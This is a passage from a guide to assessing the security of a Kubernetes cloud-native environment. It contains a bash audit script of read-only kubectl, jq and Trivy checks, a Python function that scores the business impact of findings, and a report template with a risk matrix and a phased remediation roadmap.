run_assessment "service-accounts" "kubectl get serviceaccounts -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name' && echo && kubectl get pods -A -o json | jq -r '.items[] | select(.spec.serviceAccountName == \"default\" or .spec.serviceAccountName == null) | \"\(.metadata.namespace)/\(.metadata.name): Using default service account\"' | head -10"

# Secrets management assessment
run_assessment "secrets-analysis" "kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type' && echo && kubectl get crd 2>/dev/null | grep -E '(secret|vault|external)' || echo 'No external secret management CRDs found'"

# Service mesh assessment
run_assessment "service-mesh-discovery" "kubectl get namespace istio-system 2>/dev/null && echo '✅ Istio detected' || echo '❌ Istio not found'; kubectl get namespace linkerd 2>/dev/null && echo '✅ Linkerd detected' || echo '❌ Linkerd not found'; kubectl get pods -A | grep consul && echo '✅ Consul detected' || echo '❌ Consul not found'"

if kubectl get namespace istio-system >/dev/null 2>&1; then
    run_assessment "istio-security" "kubectl get peerauthentication -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,MTLS:.spec.mtls.mode' && echo && kubectl get authorizationpolicy -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,SELECTOR:.spec.selector.matchLabels'"
fi

# API Gateway and ingress security
run_assessment "api-gateway-security" "kubectl get ingresses -A -o json | jq -r '.items[] | \"\(.metadata.namespace)/\(.metadata.name): \" + (.spec.rules[] | \"\(.host)\" + (.http.paths[] | \" \(.path) -> \(.backend.service.name):\(.backend.service.port.number)\"))' | head -20"

# Monitoring and observability
run_assessment "observability-stack" "kubectl get pods -A | grep -E '(prometheus|grafana|jaeger|elasticsearch|fluentd|falco)' && echo '✅ Observability components detected' || echo '❌ Limited observability detected'"

# Supply chain security
run_assessment "supply-chain-security" "kubectl get crd vulnerabilityreports.aquasecurity.github.io 2>/dev/null && echo '✅ Trivy Operator detected' || echo '❌ Trivy Operator not found'; kubectl get crd constraints.templates.gatekeeper.sh 2>/dev/null && echo '✅ Gatekeeper OPA detected' || echo '❌ Gatekeeper not found'; kubectl get crd policies.kyverno.io 2>/dev/null && echo '✅ Kyverno detected' || echo '❌ Kyverno not found'"

# Container image analysis
run_assessment "container-images" "kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\\n' | sort -u > /tmp/cluster_images.txt && echo 'Unique container images:' && cat /tmp/cluster_images.txt | wc -l && echo && echo 'Images with latest tag:' && cat /tmp/cluster_images.txt | grep ':latest' | wc -l && echo && echo 'Most used images:' && kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\\n' | sort | uniq -c | sort -nr | head -10"

# Generate executive summary
{
    echo "=== Cloud-Native Security Assessment Executive Summary ==="
    echo "Assessment Date: $(date)"
    echo "Cluster: $(kubectl config current-context)"
    echo
    
    total_pods=$(kubectl get pods -A --no-headers | wc -l)
    total_services=$(kubectl get services -A --no-headers | wc -l)
    total_namespaces=$(kubectl get namespaces --no-headers | wc -l)
    
    echo "Infrastructure Overview:"
    echo "- Total Namespaces: $total_namespaces"
    echo "- Total Pods: $total_pods"
    echo "- Total Services: $total_services"
    echo
    
    # Security posture summary
    echo "Security Posture Summary:"
    
    # Pod Security Standards
    pss_enforced=$(kubectl get namespaces -o json | jq -r '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] != null) | .metadata.name' | wc -l)
    echo "- Pod Security Standards enforced: $pss_enforced/$total_namespaces namespaces"
    
    # Network Policies
    netpol_count=$(kubectl get networkpolicies -A --no-headers | wc -l)
    echo "- Network Policies deployed: $netpol_count"
    
    # Service Mesh
    if kubectl get namespace istio-system >/dev/null 2>&1; then
        echo "- Service Mesh: Istio detected"
    elif kubectl get namespace linkerd >/dev/null 2>&1; then
        echo "- Service Mesh: Linkerd detected"  
    else
        echo "- Service Mesh: Not detected"
    fi
    
    # Security monitoring
    if kubectl get pods -A | grep -E "(falco|sysdig)" >/dev/null; then
        echo "- Runtime Security: Enabled"
    else
        echo "- Runtime Security: Not detected"
    fi
    
    echo
    echo "Key Recommendations:"
    echo "1. Review and implement Pod Security Standards across all namespaces"
    echo "2. Deploy network policies for traffic segmentation"
    echo "3. Implement comprehensive security monitoring"
    echo "4. Establish supply chain security controls"
    echo "5. Configure service mesh for zero-trust networking"
    
    echo
    echo "Detailed findings available in individual assessment files."
    
} > "$REPORT_DIR/executive-summary.txt"

echo
echo "=== Cloud-Native Security Assessment Complete ==="
echo "Results saved in: $REPORT_DIR"
echo "Review the executive-summary.txt file for key findings"

# Optional: Generate vulnerability scan if Trivy is available
if command -v trivy >/dev/null 2>&1; then
    echo "Generating vulnerability scan report..."
    mkdir -p "$REPORT_DIR/vulnerability-scans"
    
    kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u | head -10 | while read image; do
        echo "Scanning $image..."
        trivy image --severity CRITICAL,HIGH --format json "$image" > "$REPORT_DIR/vulnerability-scans/$(echo $image | tr '/' '_' | tr ':' '_').json" 2>/dev/null || echo "Failed to scan $image"
    done
    echo "Vulnerability scans completed in $REPORT_DIR/vulnerability-scans/"
fi

echo "Assessment artifacts location: $REPORT_DIR"
```

## Risk Assessment and Scoring

### Cloud-Native Security Risk Matrix
| Risk Category | Low (1-3) | Medium (4-6) | High (7-8) | Critical (9-10) |
|---------------|-----------|--------------|------------|-----------------|
| **Architecture Security** | Zero-trust implemented | Partial segmentation | Limited security controls | No security architecture |
| **API Security** | Comprehensive API security | Basic authentication | Limited input validation | No API security |
| **Service Mesh Security** | mTLS + authorization policies | mTLS enabled | Basic service mesh | No service mesh |
| **Supply Chain Security** | Image signing + SBOM | Vulnerability scanning | Basic image security | Unknown image sources |
| **Secrets Management** | External secret management | K8s secrets encrypted | Basic secrets | Hardcoded secrets |
| **Monitoring & Response** | Full observability + SOAR | Good monitoring | Basic logging | No monitoring |

### Business Impact Assessment
```python
def calculate_cloud_native_business_impact(finding, app_context):
    """Calculate business impact for cloud-native security findings"""
    
    # Base risk scoring
    risk_scores = {
        'critical': 10,
        'high': 7,
        'medium': 4,  
        'low': 2
    }
    
    base_risk = risk_scores.get(finding.severity.lower(), 1)
    
    # Application tier impact multiplier
    tier_multipliers = {
        'api_gateway': 2.0,      # Single point of failure
        'frontend': 1.5,         # User-facing
        'backend_service': 1.3,  # Core business logic
        'data_service': 1.8,     # Data access
        'auth_service': 2.2,     # Authentication critical
        'internal_service': 1.0  # Internal only
    }
    
    tier_impact = tier_multipliers.get(app_context.service_tier, 1.0)
    
    # Microservices blast radius
    service_count = app_context.connected_services
    if service_count > 10:
        blast_radius = 1.5  # High interconnectedness
    elif service_count > 5:
        blast_radius = 1.3  # Medium interconnectedness  
    else:
        blast_radius = 1.0  # Low interconnectedness
    
    # Data sensitivity multiplier
    data_sensitivity = {
        'public': 1.0,
        'internal': 1.2,
        'confidential': 1.5,
        'restricted': 2.0,
        'pii': 2.2,
        'financial': 2.5
    }.get(app_context.data_classification, 1.0)
    
    # Availability requirements
    availability_req = {
        '99.99': 2.0,   # Mission critical
        '99.9': 1.5,    # High availability
        '99.5': 1.2,    # Standard
        '99.0': 1.0     # Basic
    }.get(app_context.sla_requirement, 1.0)
    
    final_impact = min(
        base_risk * tier_impact * blast_radius * data_sensitivity * availability_req,
        10
    )
    
    return {
        'business_impact_score': round(final_impact, 1),
        'impact_factors': {
            'base_risk': base_risk,
            'service_tier': tier_impact,
            'blast_radius': blast_radius,
            'data_sensitivity': data_sensitivity,
            'availability': availability_req
        },
        'remediation_urgency': get_urgency_level(final_impact)
    }

def get_urgency_level(impact_score):
    if impact_score >= 8:
        return 'Emergency - Immediate action required'
    elif impact_score >= 6:
        return 'High - Address within 24-48 hours'
    elif impact_score >= 4:
        return 'Medium - Address within 1 week'
    else:
        return 'Low - Include in next sprint'
```

## Report Template

### Executive Summary
**Cloud-Native Security Assessment Summary**
- **Assessment Date**: [Date]  
- **Applications Assessed**: [Number] cloud-native applications
- **Microservices Count**: [Number] individual services
- **Overall Security Maturity**: [Level] (Initial/Developing/Defined/Managed/Optimized)
- **Critical Security Gaps**: [Count]

**Architecture Overview**:
- **Service Mesh**: [Istio/Linkerd/None] - [Configured/Partially Configured/Not Configured]
- **API Gateway**: [Type] - [Security Level]
- **Secrets Management**: [External/Kubernetes/Hardcoded]
- **Monitoring Stack**: [Comprehensive/Basic/Limited/None]

**CNCF Security Assessment**:
1. **Cloud, Container & Orchestration**: [Compliant %]
2. **Injection Flaws**: [Compliant %]
3. **Identity & Access Management**: [Compliant %]
4. **Logging & Monitoring**: [Compliant %]
5. **Secrets Storage**: [Compliant %]

### Detailed Technical Assessment

#### Application Security Posture
| Service Tier | Service Count | mTLS Enabled | Authorization Policies | Input Validation | Monitoring Coverage |
|--------------|---------------|--------------|------------------------|------------------|-------------------|
| API Gateway | [X] | [Y]% | [Z]% | [A]% | [B]% |
| Frontend Services | [X] | [Y]% | [Z]% | [A]% | [B]% |
| Backend Services | [X] | [Y]% | [Z]% | [A]% | [B]% |
| Data Services | [X] | [Y]% | [Z]% | [A]% | [B]% |

#### Service Mesh Security Configuration
| Security Control | Coverage | Configuration Quality | Risk Level |
|------------------|----------|----------------------|------------|
| Mutual TLS | [X]% | [Good/Fair/Poor] | [Low/Medium/High] |
| Authorization Policies | [Y]% | [Good/Fair/Poor] | [Low/Medium/High] |
| Traffic Policies | [Z]% | [Good/Fair/Poor] | [Low/Medium/High] |
| Security Headers | [A]% | [Good/Fair/Poor] | [Low/Medium/High] |

#### Supply Chain Security Metrics
| Security Control | Implementation Status | Coverage % | Risk Mitigation |
|------------------|----------------------|------------|-----------------|
| Image Vulnerability Scanning | [Implemented/Partial/None] | [X]% | [High/Medium/Low] |
| Image Signing Verification | [Implemented/Partial/None] | [Y]% | [High/Medium/Low] |
| SBOM Generation | [Implemented/Partial/None] | [Z]% | [High/Medium/Low] |
| Policy Enforcement | [Implemented/Partial/None] | [A]% | [High/Medium/Low] |

### Critical Findings and Remediation

#### High-Risk Findings
1. **Lack of Service Mesh Security**: [X] services without mTLS protection
   - **Impact**: Inter-service communication unencrypted and unauthenticated
   - **Remediation**: Deploy Istio/Linkerd with strict mTLS policies
   - **Timeline**: 2-4 weeks

2. **API Security Gaps**: [Y] APIs without proper authentication/authorization
   - **Impact**: Unauthorized access to business-critical functions
   - **Remediation**: Implement OAuth2/OIDC with API gateway policies
   - **Timeline**: 1-2 weeks

3. **Supply Chain Vulnerabilities**: [Z] container images with critical CVEs
   - **Impact**: Exploitable vulnerabilities in production workloads
   - **Remediation**: Implement automated vulnerability scanning and remediation
   - **Timeline**: 1 week

### Remediation Roadmap

#### Phase 1: Critical Security Controls (Weeks 1-4)
- [ ] Deploy service mesh with mTLS enabled
- [ ] Implement API authentication and authorization
- [ ] Enable vulnerability scanning and remediation
- [ ] Configure Pod Security Standards

#### Phase 2: Security Hardening (Weeks 5-8)  
- [ ] Deploy comprehensive monitoring and alerting
- [ ] Implement network policies for microsegmentation
- [ ] Configure external secrets management
- [ ] Establish incident response procedures

#### Phase 3: Advanced Security (Weeks 9-16)
- [ ] Implement zero-trust network architecture
- [ ] Deploy runtime security monitoring
- [ ] Establish supply chain security controls
- [ ] Configure automated security testing

#### Phase 4: Security Optimization (Weeks 17-24)
- [ ] Implement advanced threat detection
- [ ] Deploy security chaos engineering
- [ ] Establish continuous compliance monitoring
- [ ] Create security culture and training

### Long-term Cloud-Native Security Strategy

1. **Zero Trust Architecture**: Implement comprehensive identity verification and least-privilege access across all services

2. **Automated Security**: Deploy security automation for vulnerability management, policy enforcement, and incident response

3. **Observability-Driven Security**: Establish comprehensive security observability with distributed tracing and behavioral analysis

4. **Supply Chain Security**: Implement end-to-end supply chain security with signing, verification, and provenance tracking

5. **Security as Code**: Embed security policies and controls as code throughout the development lifecycle

### ROI and Business Value
**Security Investment**: $[X] over 12 months
- Service mesh implementation: $[Y]
- Security tooling and monitoring: $[Z]
- Training and professional services: $[A]

**Risk Reduction Value**: $[X] in avoided incident costs
**Compliance Benefits**: Accelerated audit processes and reduced compliance overhead
**Developer Productivity**: Improved development velocity through automated security controls

This comprehensive cloud-native security assessment provides the foundation for building a robust, scalable, and secure modern application architecture that leverages cloud-native technologies while maintaining strong security posture and operational excellence.